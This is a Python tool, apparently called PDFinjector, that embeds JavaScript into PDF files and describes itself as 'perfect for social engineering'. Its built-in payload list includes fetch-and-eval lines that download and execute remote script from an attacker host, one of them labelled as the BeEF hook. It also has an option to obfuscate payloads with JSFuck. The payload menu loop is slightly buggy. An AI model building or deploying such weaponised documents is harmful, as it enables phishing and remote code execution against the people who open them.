#TODO: ADD BANNER AND LOGO
#https://pypdf.readthedocs.io/en/stable/user/add-javascript.html

from pypdf import PdfWriter
import argparse, execjs, time


parser = argparse.ArgumentParser(description="PDFinjector can insert javascript code in pdf files, perfect for social engineering.")

parser.add_argument("-f", "--file", type=str, help="the input file", required=True)
parser.add_argument("-o", "--output", type=str, help="the output file, if not set it will overwrite the input file")
parser.add_argument("-cp", "--custompayload", type=str, help="the custom payload to inject, via text")
parser.add_argument("-cfp", "--customfilepayload", type=str, help="the custompayload to inject, via file.js")
parser.add_argument("-ob", "--obfuscate", action="store_true", help="obfuscate the code using jsfuck")

args = parser.parse_args()

banner = """"""
payloads = [
    "alert('ARGUMENT');", "classic alert text", 
    
    "console.log('JavaScript is running'); alert('ARGUMENT');", "log to console and alerts",

    """fetch('https://ARGUMENT/ARGUMENT1.js')
    .then(response => response.text())
    .then(script => eval(script))
    .catch(error => console.error('Error loading script:', error));""", "a code in a remote server",
    
    """fetch('https://ARGUMENT/hook.js')
    .then(response => response.text())
    .then(script => eval(script))
    .catch(error => console.error('Error loading script:', error));""", "the BeEF hook"
]

def inject(pdft, payload, output):
    print("INJECT...")
    pdf = PdfWriter(clone_from=pdft)
    pdf.add_js(payload)        
    with open(output, "wb") as pdftrg:
        pdf.write(pdftrg)

def obf(payload):
    f = open("lib/jsfuck.js", 'r')
    f = f.read()
    js = execjs.get()
    cjs = js.compile(f)
    return cjs.call('JSFuck',payload,'1')

def main():
    payload = ""

    if args.custompayload:
        payload = args.custompayload
    elif args.customfilepayload:
        payload = args.customfilepayload
    else:
        c = 0
        for i in range(int(len(payloads)/2)):
            print(c + 1)
            print("CODE:")
            print(payloads[c])
            print("DESCRIPTION:")
            print(payloads[c + 1])
            c+= 1
        payload = input("select the number of the payload: ")
        payload = payloads[int(payload)*2-2]
    

    if args.obfuscate:
        try:
            payload = obf(payload)
        except Exception as e:
            print(f'error during obfuscation: {e}')

    if args.file:
        print("USING:", payload)
        try:
            if args.output:
                inject(args.file, payload, args.output)
            else:
                inject(args.file, payload, args.file)
        except Exception as e:
            print(f'error during injection: {e}')

main()